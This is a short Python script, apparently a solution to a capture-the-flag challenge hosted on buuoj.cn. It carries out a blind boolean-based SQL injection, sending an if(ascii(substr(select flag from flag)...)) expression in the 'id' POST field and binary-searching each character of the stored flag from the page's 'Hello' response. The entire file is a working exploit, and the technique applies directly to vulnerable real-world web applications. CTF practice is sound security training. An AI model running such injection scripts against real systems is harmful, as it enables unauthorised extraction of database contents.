import requests
import time
#url是随时更新的，具体的以做题时候的为准
url = 'http://724cc1e1-23a6-47e5-9cbb-15775b9ae8b4.node3.buuoj.cn/index.php'
data = {"id": ""}
flag = 'flag{'

i = 6
while True:
    #从可打印字符开始
    begin = 32
    end = 127
    tmp = (begin + end) // 2
    while begin < end:
        print(begin, tmp, end)
        time.sleep(1)
        data[
            "id"] = "if(ascii(substr((select       flag        from    flag),{},1))>{},1,2)".format(
                i, tmp)
        r = requests.post(url, data=data)
        if 'Hello' in r.text:
            begin = tmp + 1
            tmp = (begin + end) // 2
        else:
            end = tmp
            tmp = (begin + end) // 2

    flag += chr(tmp)
    print(flag)
    i += 1
    if flag[-1] == '}':
        break
